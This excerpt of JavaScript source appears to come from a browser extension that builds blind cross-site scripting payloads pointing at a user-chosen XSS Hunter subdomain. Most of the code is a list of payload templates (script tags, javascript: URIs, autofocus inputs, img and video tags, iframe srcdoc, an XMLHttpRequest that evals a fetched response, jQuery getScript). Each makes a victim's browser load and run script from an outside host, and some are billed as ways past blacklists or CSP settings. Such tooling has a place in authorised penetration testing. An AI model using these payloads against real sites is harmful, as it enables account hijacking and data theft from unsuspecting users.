...
chrome.storage.sync.get('xssHunterSubdomain', function(answer) {
  var subdomain = answer.xssHunterSubdomain;
...
var payloads = [
  {
    title:
      ' <label><code>&lt;script&gt;</code> Tag Payload</label> - Basic XSS payload.<br>',
  ...
  {
    title:
      '<label><code>javascript:</code> URI Payload</label> - For use where URI\'s are taken as input. <br> ',
    payload: function(subdomain) {
      return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" +
        subdomain +
  ...
  {
    title:
      '<label for="input_tag_payload"><code>&lt;input&gt;</code> Tag Payload</label> - For bypassing poorly designed blacklist systems with the HTML5 <code>autofocus</code> attribute.<br>',
    payload: function(subdomain) {
      var temp =
        'var a=document.createElement("script");a.src="https://' +
        subdomain +
        '";document.body.appendChild(a);';
      temp = btoa(temp);
      // HTML encode
  ...
  {
    title:
      '<label for="img_tag_payload"><code>&lt;img&gt;</code> Tag Payload</label> - Another basic payload for when <code>&lt;script&gt;</code> tags are explicitly filtered.<br>',
    payload: function(subdomain) {
      var temp =
        'var a=document.createElement("script");a.src="https://' +
        subdomain +
  ...
  {
    title:
      '<label for="source_tag_payload"><code>&lt;video&gt;&lt;source&gt;</code> Tag Payload</label> - HTML5 payload, only works in Firefox, Chrome and Opera<br>',
    payload: function(subdomain) {
      var temp =
        'var a=document.createElement("script");a.src="https://' +
        subdomain +
  ...
  {
    title:
      '<label for="srcdoc_tag_payload"><code>&lt;iframe srcdoc=</code> Tag Payload</label> - HTML5 payload, only works in Firefox, Chrome and Opera<br>',
    payload: function(subdomain) {
      var temp =
        '<script>var a=parent.document.createElement("script");a.src="https://' +
        subdomain +
  ...
  {
    title:
      '<label for="xhr_payload"><code>XMLHTTPRequest</code> Payload</label> - For exploitation of web applications with Content Security Policies containing <code>script-src</code> but have <code>unsafe-inline</code> enabled.<br>',
    payload: function(subdomain) {
      return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' +
        subdomain +
        '");a.send();</script>';
    },
  },
  {
    title:
      '<label for="getscript_payload"><code>$.getScript()</code> Payload</label> - Example payload for sites that include JQuery<br>',
    payload: function(subdomain) {
...
function getButton(payload) {
  return (
    ...
    htmlEncode(payload) +
    '" class="btn btn-info btn-block payloadCopy"><span class="glyphicon glyphicon-share"></span> Copy Payload to Clipboard</button>'
  );
}

// Get the payload input
function getInput(payload) {
  return '<input type="text" class="form-control payloadInput" value="' +
    htmlEncode(payload) +
    '">';
}
...
$('#subdomain').on('change textInput input', function() {
  ...
  chrome.storage.sync.set({ xssHunterSubdomain: subdomain });
  $('#payloads').html('');
  setPayloads(subdomain);
});
